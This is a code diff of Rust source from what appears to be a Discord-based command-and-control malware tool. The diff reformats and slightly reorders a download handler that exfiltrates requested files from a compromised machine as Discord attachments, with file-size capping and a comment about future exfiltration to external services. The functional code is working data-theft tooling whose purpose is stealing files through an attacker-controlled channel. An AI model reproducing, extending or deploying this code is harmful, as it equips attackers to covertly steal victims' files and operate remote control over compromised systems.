@@ -100,10 +100,11 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
 
     // We will eventually support exfil to external services here. Capping downloads to 25mb for now.
     if metadata.len() >= 25 * (1024 * 1024) {
-        return Err(DiscordC2Error::InternalError(
-            format!("File size is too large: ({} bytes)", metadata.len()
+        return Err(DiscordC2Error::InternalError(format!(
+            "File size is too large: ({} bytes)",
+            metadata.len()
         )));
-    } 
+    }
 
     let file_name = file_path
         .file_name()
@@ -148,23 +149,33 @@ pub async fn download_handler(
 ) -> Result<(), DiscordC2Error> {
     let response = send_interaction_response(ctx, command, "Downloading file...", None).await?;
     let attachment = run(&command.data.options).await;
-    
+
     let ctx1 = ctx.clone();
 
     match attachment {
         Ok(Some(attachment)) => {
-            informational!("Successfully exfiltrated the requested file.");
+            informational!("Beginning file exfiltration...");
             tokio::spawn(async move {
-                if let Err(why) = send_follow_up_response(&ctx1, &response, "Successfully exfiltrated the file!", Some(attachment),).await {
+                if let Err(why) = send_follow_up_response(
+                    &ctx1,
+                    &response,
+                    "Successfully exfiltrated the file!",
+                    Some(attachment),
+                )
+                .await
+                {
                     error!("Error sending follow up response: {}.", why);
                 }
-                
+
                 if let Err(why) = response
                     .delete_original_interaction_response(&ctx1.http)
-                    .await {
-                        error!("Error deleting original interaction response: {}.", why);
+                    .await
+                {
+                    error!("Error deleting original interaction response: {}.", why);
                 }
+                informational!("Succesfully exfiltrated the file.");
             });
+           
         }
         Err(reason) => {
             error!("Failed to exfiltrate the file: {}", reason);
